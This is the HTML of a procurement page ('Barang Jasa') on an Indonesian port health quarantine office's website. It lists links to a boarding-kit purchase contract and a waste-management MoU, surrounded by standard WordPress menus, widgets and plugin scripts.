		<li id="menu-item-5056" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5056"><a href="https://kkpbanjarmasin.or.id/informasi-yang-dikecualikan/" itemprop="url">Informasi Yang Dikecualikan</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-3983" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3983"><a href="#" itemprop="url">WBK dan WBBM</a>
<ul class="sub-menu">
	<li id="menu-item-3984" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3984"><a href="https://kkpbanjarmasin.or.id/tentang-wbk/" itemprop="url">Tentang WBK</a></li>
	<li id="menu-item-3985" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3985"><a href="https://kkpbanjarmasin.or.id/saran-dan-pengaduan/" itemprop="url">Saran dan Pengaduan Masyarakat</a></li>
	<li id="menu-item-4350" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4350"><a href="https://kkpbanjarmasin.or.id/whistle-blowing-system/" itemprop="url">Whistle Blowing System</a></li>
	<li id="menu-item-4351" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4351"><a target="_blank" href="https://www.lapor.go.id/" itemprop="url">Span Lapor</a></li>
	<li id="menu-item-4352" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4352"><a href="https://kkpbanjarmasin.or.id/formulir-laporan-gratifikasi/" itemprop="url">Gratifikasi Online</a></li>
</ul>
</li>
<li id="menu-item-4283" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4283"><a href="https://kkpbanjarmasin.or.id/frequently-asked-question/" itemprop="url">FAQs</a></li>
</ul>
</nav><!-- #site-navigation -->
			</div>
</header><!-- #masthead -->
</div><div class="penci-header-mobile" >
	<div class="penci-header-mobile_container">
        <button class="menu-toggle navbar-toggle" aria-expanded="false"><span class="screen-reader-text">Primary Menu</span><i class="fa fa-bars"></i></button>
								</div>
</div><div class='marquee-hsas-shortcode-34' style='width: 100%;overflow: hidden;'><span style="color: #000000;">Selamat Datang di Zona Integritas BKK Kelas I Banjarmasin.</span>&nbsp;&nbsp;&nbsp;<span style="color: #000000;">Wilayah Bebas dari Korupsi (WBK) dan Wilayah Birokrasi Bersih Melayani (WBBM).</span></div><script>jQuery(function(){jQuery('.marquee-hsas-shortcode-34').marquee({allowCss3Support: true,css3easing: 'linear',easing: 'linear',delayBeforeStart: 2000,direction: 'left',duplicated: true,duration: 15000,gap: 50,pauseOnCycle: true,pauseOnHover: true,startVisible: true});});</script>
	<div id="content" class="site-content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" >
			


<div class="penci-container">
	<div class="penci-container__content penci-con_sb2_sb1">
		<div class="penci-wide-content penci-content-novc penci-sticky-content">
			<div class="theiaStickySidebar">
						<div class="penci-content-post hide_featured_image">
				<div class="penci_breadcrumbs "><ul itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a class="home" href="https://kkpbanjarmasin.or.id" itemprop="item"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><i class="fa fa-angle-right"></i><a href="https://kkpbanjarmasin.or.id/barang-jasa/" itemprop="item"><span itemprop="name">Barang Jasa</span></a><meta itemprop="position" content="2" /></li></ul></div>					<article id="post-4779" class="penci-content-current-page post-4779 page type-page status-publish hentry penci-post-item">
													<header class="entry-header penci-entry-header">
								<h1 class="entry-title penci-entry-title penci-title-">Barang Jasa</h1><div class="penci-schema-markup"><span class="author vcard"><a class="url fn n" href="https://kkpbanjarmasin.or.id/author/admkkp/">admkkp</a></span><time class="entry-date published" datetime="2024-11-08T03:24:05+00:00">November 8, 2024</time><time class="updated" datetime="2024-11-11T02:11:45+00:00">November 11, 2024</time></div>															</header>
													<div class="penci-entry-content entry-content">
							
<table id="tablepress-3" class="tablepress tablepress-id-3">
<thead>
<tr class="row-1 odd">
	<th class="column-1">PENGADAAN ALAT DAN<br />
BAHAN PENUNJANG<br />
KEKARANTINAAN -<br />
BOARDING KIT</th><th class="column-2"><a href="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/SPK-Kontrak-Pengadan-Langsung-Barang-Boarding-Kit.pdf">SPK Kontrak Pengadan Langsung Barang Boarding Kit</a></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">MOU PENGELOLAAN LIMBAH</td><td class="column-2"><a href="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/4.-MoU-Limbah-KKP-Bjm-SBL.pdf">4. MoU Limbah KKP Bjm - SBL</a></td>
</tr>
</tbody>
</table>
<!-- #tablepress-3 from cache -->
						</div>
						<footer class="penci-entry-footer"><span class="penci-social-buttons penci-social-share-footer"><a href="#" class="penci-post-like penci_post-meta_item  single-like-button penci-social-item like" data-post_id="4779" title="Like" data-like="Like" data-unlike="Unlike"><i class="fa fa-thumbs-o-up"></i><span class="penci-share-number">0</span></a><a class="penci-social-item facebook" target="_blank" rel="noopener" title="" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fbarang-jasa%2F"><i class="fa fa-facebook"></i></a><a class="penci-social-item email" target="_blank" rel="noopener" href="/cdn-cgi/l/email-protection#c6f9b5b3a4aca3a5b2fb84a7b4a7a8a1e3f4f68ca7b5a7e0e5f6f5fefd8489829ffbaeb2b2b6b5fce9e9adadb6a4a7a8aca7b4aba7b5afa8e8a9b4e8afa2e9a4a7b4a7a8a1ebaca7b5a7e9"><i class="fa fa-envelope"></i></a></span></footer>					</article>
								</div>
			</div>
		</div>
				
<aside class="widget-area widget-area-1 penci-sticky-sidebar penci-sidebar-widgets">
	<div class="theiaStickySidebar">
	<div id="search-2" class="widget  penci-block-vc penci-widget-sidebar style-title-1 style-title-left widget_search"><form method="get" class="search-form" action="https://kkpbanjarmasin.or.id/">
	<label>
		<span class="screen-reader-text">Search for:</span>
		<input type="search" class="search-field" placeholder="Enter keyword..." value="" name="s">
	</label>
	<button type="submit" class="search-submit">
		<i class="fa fa-search"></i>
		<span class="screen-reader-text">Search</span>
	</button>
</form>
</div>
		<div id="recent-posts-2" class="widget  penci-block-vc penci-widget-sidebar style-title-1 style-title-left widget_recent_entries">
		<div class="penci-block-heading"><h4 class="widget-title penci-block__title"><span>Recent Posts</span></h4></div>
		<ul>
											<li>
					<a href="https://kkpbanjarmasin.or.id/5585-2/">(no title)</a>
									</li>
											<li>
					<a href="https://kkpbanjarmasin.or.id/5383-2/">(no title)</a>
									</li>
											<li>
					<a href="https://kkpbanjarmasin.or.id/5321-2/">(no title)</a>
									</li>
											<li>
					<a href="https://kkpbanjarmasin.or.id/5209-2/">BKK Kelas I Banjarmasin meraih penghargaan sebagai Unit Pelaksana Teknis (UPT) dengan Pemantauan dan Evaluasi Penyelenggara Publik (PEKPP) Mendiri Tahun 2024</a>
									</li>
											<li>
					<a href="https://kkpbanjarmasin.or.id/5196-2/">Pengawasan Faktor Risiko pada Kedatangan Pesawat (Private Jet) dari Luar Negeri</a>
									</li>
					</ul>

		</div><div id="categories-2" class="widget  penci-block-vc penci-widget-sidebar style-title-1 style-title-left widget_categories"><div class="penci-block-heading"><h4 class="widget-title penci-block__title"><span>Categories</span></h4></div>
			<ul>
					<li class="cat-item cat-item-6"><a href="https://kkpbanjarmasin.or.id/category/berita/">Berita</a>
</li>
	<li class="cat-item cat-item-14"><a href="https://kkpbanjarmasin.or.id/category/berita-slide/">Berita-Slide</a>
</li>
	<li class="cat-item cat-item-7"><a href="https://kkpbanjarmasin.or.id/category/dokumen/">Dokumen</a>
</li>
	<li class="cat-item cat-item-9"><a href="https://kkpbanjarmasin.or.id/category/galeri-foto/">Galeri Foto</a>
</li>
	<li class="cat-item cat-item-10"><a href="https://kkpbanjarmasin.or.id/category/galeri-video/">Galeri Video</a>
</li>
	<li class="cat-item cat-item-61"><a href="https://kkpbanjarmasin.or.id/category/layanan-ppid/">Layanan PPID</a>
</li>
	<li class="cat-item cat-item-8"><a href="https://kkpbanjarmasin.or.id/category/pengumuman/">Pengumuman</a>
</li>
	<li class="cat-item cat-item-5"><a href="https://kkpbanjarmasin.or.id/category/seksi-uklw/">Seksi UKLW</a>
</li>
			</ul>

			</div><div id="media_image-3" class="widget  penci-block-vc penci-widget-sidebar style-title-1 style-title-left widget_media_image"><img width="212" height="300" src="https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/POSTER-ANTI-KORUPSI-12-1-566x800-1-212x300.jpg" class="image wp-image-2993  attachment-medium size-medium" alt="Anti Korupsi" style="max-width: 100%; height: auto;" decoding="async" loading="lazy" srcset="https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/POSTER-ANTI-KORUPSI-12-1-566x800-1-212x300.jpg 212w, https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/POSTER-ANTI-KORUPSI-12-1-566x800-1-283x400.jpg 283w, https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/POSTER-ANTI-KORUPSI-12-1-566x800-1.jpg 566w" sizes="(max-width: 212px) 100vw, 212px" /></div>	</div>
</aside><!-- #secondary -->
	</div>
</div>
		</main><!-- #main -->
	</div><!-- #primary -->

	</div><!-- #content -->
	<footer id="colophon" class="site-footer" itemscope itemtype="http://schema.org/WPFooter">
		<meta itemprop="name" content="Webpage footer for Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
		<meta itemprop="description" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
		<meta itemprop="keywords" content="Data Protection, Copyright Data"/>
		<meta itemprop="copyrightYear" content="2025"/>
		<meta itemprop="copyrightHolder" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
				<div id="footer__sidebars" class="footer__sidebars footer__sidebar-col-2 footer__sidebars-style-2">
	<div class="footer__sidebars-inner penci-container-fluid">
		<div class="row">
							<div id="footer-1" class="footer-sidebar-item footer-1 penci-col-6">
					<div id="penci_custom_html-6" class="widget_text widget footer-widget penci-block-vc penci-fwidget-sidebar style-title-1 style-title-left widget_custom_html"><div class="penci-block-heading"><h4 class="widget-title penci-block__title"><span>BKK Kelas I Banjarmasin</span></h4></div><div class="textwidget custom-html-widget">Alamat 	: 	  	Jl. Belitung Darat No.118 A Banjarmasin<br>
No. Telpon / Fax. 	: 	  	(0511) 3353948 / (0511) 3353948<br>
Email 	: 	  	<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="39525249175b585753584b54584a5057794058515656175a5617505d">[email&#160;protected]</a></div></div>				</div>
							<div id="footer-2" class="footer-sidebar-item footer-2 penci-col-6">
					<div id="penci_custom_html-7" class="widget_text widget footer-widget penci-block-vc penci-fwidget-sidebar style-title-1 style-title-left widget_custom_html"><div class="penci-block-heading"><h4 class="widget-title penci-block__title"><span>Peta Lokasi</span></h4></div><div class="textwidget custom-html-widget"><iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3983.18687711719!2d114.57748281386777!3d-3.3038876420841565!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2de423b1dbc2b3cf%3A0x42645a8955c699aa!2sKantor%20Kesehatan%20Pelabuhan%20Kelas%20II%20Banjarmasin!5e0!3m2!1sen!2sid!4v1580523799026!5m2!1sen!2sid" width="350" height="200" frameborder="0" style="border:0;" allowfullscreen=""></iframe></div></div>				</div>
					</div>
	</div>
</div>
						<div class="footer__copyright_menu">
			<div class="footer__sidebars-inner penci-container-fluid penci_bottom-sub penci_has_copyright">
			<div class="site-info">
				@2020 - BKK Kelas I Banjarmasin All Right Reserved. 			</div><!-- .site-info -->
					</div>
	</div>	</footer><!-- #colophon -->
</div><!-- #page -->

<aside class="mobile-sidebar ">

			<div id="sidebar-nav-logo">
					</div>
				<div class="header-social sidebar-nav-social">
			<div class="inner-header-social">
				<a class="social-media-item socail_media__facebook" target="_blank" href="#" title="Facebook" rel="noopener"><span class="socail-media-item__content"><i class="fa fa-facebook"></i><span class="social_title screen-reader-text">Facebook</span></span></a><a class="social-media-item socail_media__twitter" target="_blank" href="#" title="Twitter" rel="noopener"><span class="socail-media-item__content"><i class="fa fa-twitter"></i><span class="social_title screen-reader-text">Twitter</span></span></a><a class="social-media-item socail_media__youtube" target="_blank" href="#" title="Youtube" rel="noopener"><span class="socail-media-item__content"><i class="fa fa-youtube-play"></i><span class="social_title screen-reader-text">Youtube</span></span></a>			</div>
		</div>
				<nav class="mobile-navigation" itemscope itemtype="http://schema.org/SiteNavigationElement">
			<ul id="primary-menu-mobile" class="primary-menu-mobile"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-3902"><a href="https://kkpbanjarmasin.or.id">Beranda</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3903"><a href="#">Profil</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3904"><a href="https://kkpbanjarmasin.or.id/visi-dan-misi/">Visi dan Misi</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3905"><a href="https://kkpbanjarmasin.or.id/struktur-organisasi/">Struktur Organisasi</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3906"><a href="https://kkpbanjarmasin.or.id/tugas-pokok-dan-fungsi/">Tugas Pokok dan Fungsi</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3907"><a href="https://kkpbanjarmasin.or.id/sarana-dan-prasarana/">Sarana dan Prasarana</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3908"><a href="#">Tim Kerja</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3909"><a href="https://kkpbanjarmasin.or.id/sub-bag-tata-usaha/">Sub Bagian Administrasi Umum</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3954"><a href="https://kkpbanjarmasin.or.id/tim-kerja-1/">Tim Kerja 1</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3953"><a href="https://kkpbanjarmasin.or.id/tim-kerja-2/">Tim Kerja 2</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3952"><a href="https://kkpbanjarmasin.or.id/tim-kerja-3/">Tim Kerja 3</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3951"><a href="https://kkpbanjarmasin.or.id/tim-kerja-4/">Tim Kerja 4</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3950"><a href="https://kkpbanjarmasin.or.id/tim-kerja-5/">Tim Kerja 5</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4426"><a href="https://kkpbanjarmasin.or.id/budaya-kerja/">Budaya Kerja</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3956"><a href="https://kkpbanjarmasin.or.id/core-values-berakhlak/">Core Values Berakhlak</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3957"><a href="#">Wilayah Kerja</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3958"><a href="https://kkpbanjarmasin.or.id/bandara-syamsuddin-noor/">Bandara Syamsuddin Noor</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3959"><a href="https://kkpbanjarmasin.or.id/kotabaru/">Kotabaru</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3960"><a href="https://kkpbanjarmasin.or.id/batulicin/">Batulicin</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3961"><a href="https://kkpbanjarmasin.or.id/satui/">Satui</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3962"><a href="https://kkpbanjarmasin.or.id/kintap/">Kintap</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3963"><a href="#">Layanan Publik</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3964"><a href="https://kkpbanjarmasin.or.id/buku-tamu/">Buku Tamu</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3966"><a href="#">Informasi Layanan</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3965"><a href="#">Jam Layanan</a>
		<ul class="sub-menu">
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3967"><a href="https://kkpbanjarmasin.or.id/vaksinasi/">Vaksinasi</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3968"><a href="https://kkpbanjarmasin.or.id/kekarantinaan-kesehatan/">Kekarantinaan Kesehatan</a></li>
		</ul>
</li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3969"><a href="https://kkpbanjarmasin.or.id/standar-pelayanan/">Standar Pelayanan</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3970"><a href="https://kkpbanjarmasin.or.id/hasil-survey-kepuasan-masyarakat/">Hasil Survey Kepuasan Masyarakat</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3971"><a href="https://kkpbanjarmasin.or.id/infografis-kekarantinaan-kesehatan/">Infografis Kekarantinaan Kesehatan</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-has-children menu-item-3976"><a href="#">Informasi Publik</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3972"><a href="https://kkpbanjarmasin.or.id/category/berita/">Berita</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4703"><a href="https://kkpbanjarmasin.or.id/buletin-sigar-edisi-1/">Buletin</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3973"><a href="https://kkpbanjarmasin.or.id/category/pengumuman/">Pengumuman</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-has-children menu-item-3975"><a href="#">PPID</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3978"><a href="https://kkpbanjarmasin.or.id/jam-layanan-ppid/">Layanan PPID</a>
		<ul class="sub-menu">
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3977"><a href="https://kkpbanjarmasin.or.id/form-permohonan-ppid/">Form PPID</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4803"><a href="https://kkpbanjarmasin.or.id/peraturan-kebijakan/">Peraturan / Kebijakan</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4804"><a href="https://kkpbanjarmasin.or.id/jadwal-layanan/">Jadwal Layanan</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4805"><a href="https://kkpbanjarmasin.or.id/tata-cara/">Tata Cara</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4971"><a href="https://kkpbanjarmasin.or.id/sarana-prasarana-ppid/">Sarana Prasarana PPID</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4806"><a href="https://kkpbanjarmasin.or.id/sop-2/">SOP</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5006"><a href="https://kkpbanjarmasin.or.id/daftar-informasi-publik/">Daftar Informasi Publik</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5026"><a href="https://kkpbanjarmasin.or.id/daftar-register-permohonan/">Daftar Register Permohonan</a></li>
		</ul>
</li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-4762"><a href="https://kkpbanjarmasin.or.id/laporan-tersedia-setiap-saat/">Layanan Tersedia Setiap Saat</a>
		<ul class="sub-menu">
			<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-4779 current_page_item menu-item-4807"><a href="https://kkpbanjarmasin.or.id/barang-jasa/" aria-current="page">Barang Jasa</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4808"><a href="https://kkpbanjarmasin.or.id/rencana-strategis/">Rencana Strategis</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4809"><a href="https://kkpbanjarmasin.or.id/statistik/">Statistik</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4810"><a href="https://kkpbanjarmasin.or.id/informasi-bmn/">Informasi BMN</a></li>
		</ul>
</li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3979"><a href="https://kkpbanjarmasin.or.id/informasi-berkala/">Informasi Berkala</a></li>
		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3980"><a href="#">Informasi Serta Merta</a>
		<ul class="sub-menu">
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3981"><a href="https://kkpbanjarmasin.or.id/pandemi/">Pandemi</a></li>
			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3982"><a href="https://kkpbanjarmasin.or.id/informasi-sebaran-penyakit/">Informasi Sebaran Penyakit</a></li>
		</ul>
</li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5056"><a href="https://kkpbanjarmasin.or.id/informasi-yang-dikecualikan/">Informasi Yang Dikecualikan</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3983"><a href="#">WBK dan WBBM</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3984"><a href="https://kkpbanjarmasin.or.id/tentang-wbk/">Tentang WBK</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3985"><a href="https://kkpbanjarmasin.or.id/saran-dan-pengaduan/">Saran dan Pengaduan Masyarakat</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4350"><a href="https://kkpbanjarmasin.or.id/whistle-blowing-system/">Whistle Blowing System</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4351"><a target="_blank" rel="noopener" href="https://www.lapor.go.id/">Span Lapor</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4352"><a href="https://kkpbanjarmasin.or.id/formulir-laporan-gratifikasi/">Gratifikasi Online</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4283"><a href="https://kkpbanjarmasin.or.id/frequently-asked-question/">FAQs</a></li>
</ul>		</nav>
	</aside>
<a id="close-sidebar-nav" class="header-1"><i class="fa fa-close"></i></a>
	<a href="#" id="scroll-to-top"><i class="fa fa-angle-up"></i></a>
            <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
                jQuery(function($){

                    
                });
            </script>
            <div id="fb-root"></div>
            <div id="sticky-social-icons-container" class="design-sharp alignment-left with-animation">
	<ul>
		<li  class="fa-brands-fa-youtube" len="0"><a href="https://www.youtube.com/@Balai_Karkes_Banjarmasin"   target="_blank"  class="fa-brands-fa-youtube"  ><i class="fa-brands fa-youtube" ></i></a></li><li  class="fa-brands-fa-instagram" len="0"><a href="https://www.instagram.com/balai_karkes_banjarmasin/"   target="_blank"  class="fa-brands-fa-instagram"  ><i class="fa-brands fa-instagram" ></i></a></li><li  class="fa-brands-fa-tiktok" len="0"><a href="https://www.tiktok.com/search?q=balaikarkesbanjarmasin&t=1726986059454"   target="_blank"  class="fa-brands-fa-tiktok"  ><i class="fa-brands fa-tiktok" ></i></a></li><li  class="fa-brands-fa-facebook-f" len="0"><a href="https://www.facebook.com/bkkbanjarmasin"   target="_blank"  class="fa-brands-fa-facebook-f"  ><i class="fa-brands fa-facebook-f" ></i></a></li><li  class="fa-brands-fa-x-twitter" len="0"><a href="https://twitter.com/balaikarkesbjm"   target="_blank"  class="fa-brands-fa-x-twitter"  ><i class="fa-brands fa-x-twitter" ></i></a></li>	</ul>
</div>        <div class="w3eden">
            <div id="wpdm-popup-link" class="modal fade">
                <div class="modal-dialog" style="width: 750px">
                    <div class="modal-content">
                        <div class="modal-header">
                              <h4 class="modal-title"></h4>
                        </div>
                        <div class="modal-body" id='wpdm-modal-body'>
                            <p class="wpdm-placeholder">
                                [ Placeholder content for popup link ]
                                <a href="https://www.wpdownloadmanager.com/">WordPress Download Manager - Best Download Management Plugin</a>
                            </p>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
                        </div>
                    </div><!-- /.modal-content -->
                </div><!-- /.modal-dialog -->
            </div><!-- /.modal -->


        </div>
        <script language="JavaScript">
            <!--
            jQuery(function () {
                jQuery('.wpdm-popup-link').click(function (e) {
                    e.preventDefault();
                    jQuery('#wpdm-popup-link .modal-title').html(jQuery(this).data('title'));
                    jQuery('#wpdm-modal-body').html('<i class="icon"><img align="left" style="margin-top: -1px" src="https://kkpbanjarmasin.or.id/wp-content/plugins/download-manager/assets/images/loading-new.gif" /></i>&nbsp;Please Wait...');
                    jQuery('#wpdm-popup-link').modal('show');
                    jQuery.post(this.href,{mode:'popup'}, function (res) {
                        jQuery('#wpdm-modal-body').html(res);
                    });
                    return false;
                });
            });
            //-->
        </script>
        <style type="text/css">
            #wpdm-modal-body img {
                max-width: 100% !important;
            }
            .wpdm-placeholder{
                display: none;
            }
        </style>
    <!-- Click to Chat - https://holithemes.com/plugins/click-to-chat/  v4.12 -->  
            <div class="ht-ctc ht-ctc-chat ctc-analytics ctc_wp_desktop style-2  " id="ht-ctc-chat"  
                style="display: none;  position: fixed; bottom: 15px; right: 15px;"   >
                                <div class="ht_ctc_style ht_ctc_chat_style">
                <div  style="display: flex; justify-content: center; align-items: center;  " class="ctc-analytics ctc_s_2">
    <p class="ctc-analytics ctc_cta ctc_cta_stick ht-ctc-cta  ht-ctc-cta-hover " style="padding: 0px 16px; line-height: 1.6; font-size: 15px; background-color: #25D366; color: #ffffff; border-radius:10px; margin:0 10px;  display: none; order: 0; ">WhatsApp us</p>
    <svg style="pointer-events:none; display:block; height:50px; width:50px;" width="50px" height="50px" viewBox="0 0 1024 1024">
        <defs>
        <path id="htwasqicona-chat" d="M1023.941 765.153c0 5.606-.171 17.766-.508 27.159-.824 22.982-2.646 52.639-5.401 66.151-4.141 20.306-10.392 39.472-18.542 55.425-9.643 18.871-21.943 35.775-36.559 50.364-14.584 14.56-31.472 26.812-50.315 36.416-16.036 8.172-35.322 14.426-55.744 18.549-13.378 2.701-42.812 4.488-65.648 5.3-9.402.336-21.564.505-27.15.505l-504.226-.081c-5.607 0-17.765-.172-27.158-.509-22.983-.824-52.639-2.646-66.152-5.4-20.306-4.142-39.473-10.392-55.425-18.542-18.872-9.644-35.775-21.944-50.364-36.56-14.56-14.584-26.812-31.471-36.415-50.314-8.174-16.037-14.428-35.323-18.551-55.744-2.7-13.378-4.487-42.812-5.3-65.649-.334-9.401-.503-21.563-.503-27.148l.08-504.228c0-5.607.171-17.766.508-27.159.825-22.983 2.646-52.639 5.401-66.151 4.141-20.306 10.391-39.473 18.542-55.426C34.154 93.24 46.455 76.336 61.07 61.747c14.584-14.559 31.472-26.812 50.315-36.416 16.037-8.172 35.324-14.426 55.745-18.549 13.377-2.701 42.812-4.488 65.648-5.3 9.402-.335 21.565-.504 27.149-.504l504.227.081c5.608 0 17.766.171 27.159.508 22.983.825 52.638 2.646 66.152 5.401 20.305 4.141 39.472 10.391 55.425 18.542 18.871 9.643 35.774 21.944 50.363 36.559 14.559 14.584 26.812 31.471 36.415 50.315 8.174 16.037 14.428 35.323 18.551 55.744 2.7 13.378 4.486 42.812 5.3 65.649.335 9.402.504 21.564.504 27.15l-.082 504.226z"/>
        </defs>
        <linearGradient id="htwasqiconb-chat" gradientUnits="userSpaceOnUse" x1="512.001" y1=".978" x2="512.001" y2="1025.023">
            <stop offset="0" stop-color="#61fd7d"/>
            <stop offset="1" stop-color="#2bb826"/>
        </linearGradient>
        <use xlink:href="#htwasqicona-chat" overflow="visible" style="fill: url(#htwasqiconb-chat)" fill="url(#htwasqiconb-chat)"/>
        <g>
            <path style="fill: #FFFFFF;" fill="#FFF" d="M783.302 243.246c-69.329-69.387-161.529-107.619-259.763-107.658-202.402 0-367.133 164.668-367.214 367.072-.026 64.699 16.883 127.854 49.017 183.522l-52.096 190.229 194.665-51.047c53.636 29.244 114.022 44.656 175.482 44.682h.151c202.382 0 367.128-164.688 367.21-367.094.039-98.087-38.121-190.319-107.452-259.706zM523.544 808.047h-.125c-54.767-.021-108.483-14.729-155.344-42.529l-11.146-6.612-115.517 30.293 30.834-112.592-7.259-11.544c-30.552-48.579-46.688-104.729-46.664-162.379.066-168.229 136.985-305.096 305.339-305.096 81.521.031 158.154 31.811 215.779 89.482s89.342 134.332 89.312 215.859c-.066 168.243-136.984 305.118-305.209 305.118zm167.415-228.515c-9.177-4.591-54.286-26.782-62.697-29.843-8.41-3.062-14.526-4.592-20.645 4.592-6.115 9.182-23.699 29.843-29.053 35.964-5.352 6.122-10.704 6.888-19.879 2.296-9.176-4.591-38.74-14.277-73.786-45.526-27.275-24.319-45.691-54.359-51.043-63.543-5.352-9.183-.569-14.146 4.024-18.72 4.127-4.109 9.175-10.713 13.763-16.069 4.587-5.355 6.117-9.183 9.175-15.304 3.059-6.122 1.529-11.479-.765-16.07-2.293-4.591-20.644-49.739-28.29-68.104-7.447-17.886-15.013-15.466-20.645-15.747-5.346-.266-11.469-.322-17.585-.322s-16.057 